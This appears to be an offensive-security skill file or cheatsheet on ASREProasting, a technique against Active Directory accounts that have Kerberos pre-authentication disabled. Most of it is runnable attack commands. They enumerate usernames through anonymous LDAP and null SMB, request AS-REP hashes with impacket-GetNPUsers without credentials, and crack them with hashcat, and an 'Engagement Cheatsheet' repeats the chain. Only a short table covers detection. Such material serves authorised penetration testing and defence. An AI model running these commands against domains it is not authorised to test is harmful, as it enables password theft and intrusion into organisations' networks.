---
name: offensive-asreproasting
description: "ASREProasting — capturing AS-REP (Authentication Service Reply) for accounts with DONT_REQUIRE_PREAUTH set, then cracking the encrypted timestamp with hashcat 18200. Anyone with a username list can attempt this; no authentication required. Use early in engagement on unauthenticated network access — the hash list comes free of charge if any accounts have pre-auth disabled."
---

# ASREProasting

Pre-authentication exists to make Kerberos password attacks harder. When an account has `DONT_REQUIRE_PREAUTH` set, the KDC issues an AS-REP encrypted with the account's password hash to anyone who asks. Crack offline.

## Quick Workflow

1. Get a list of usernames (anonymous LDAP, OSINT, common defaults)
2. Request AS-REP for each via `GetNPUsers`
3. Crack offline

---

## Detect Vulnerable Accounts

```powershell
# PowerView
Get-DomainUser -PreauthNotRequired
```

```bash
# impacket — even without auth (if you have a username list)
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.0.0.1 -no-pass

# nxc with credentials
nxc ldap dc -u user -p pass --asreproast
```

Output:

```
$krb5asrep$23$user@CORP.LOCAL:abc123...
```

Mode `23` is RC4. AES variants exist (mode 17/18) but rarer.

## Crack

```bash
hashcat -m 18200 asrep.txt rockyou.txt -r OneRuleToRuleThemAll.rule
```

Same crack-speed properties as Kerberoasting. Service-style accounts that disable pre-auth (often legacy app integration) are common in older environments.

## Username Source

```bash
# Anonymous LDAP enum
ldapsearch -x -H ldap://dc -s sub -b "dc=corp,dc=local" "(objectclass=user)" sAMAccountName 2>/dev/null

# Null SMB (may yield user list on legacy DCs)
nxc smb dc -u '' -p '' --users

# Generated lists (firstname.lastname combinations from OSINT)
# Names from LinkedIn / company website
```

## Detection

| Signal | Defender View |
|---|---|
| Volume of AS-REQ without pre-auth | DC event 4768 with `Pre-Authentication Type 0` |
| Repeated requests from one source | Behavioral analytics |
| Accounts vulnerable in modern AD | Anomaly: should be zero |

MDI flags ASREProasting reasonably well in modern environments. The bug is the misconfigured account, not the attacker visibility.

## Engagement Cheatsheet

```bash
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip dc -no-pass -format hashcat
hashcat -m 18200 asrep.txt rockyou.txt -r OneRuleToRuleThemAll.rule
```

## Key References

- impacket-GetNPUsers
- "ASREProast" original technique disclosure
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/asreproast.md
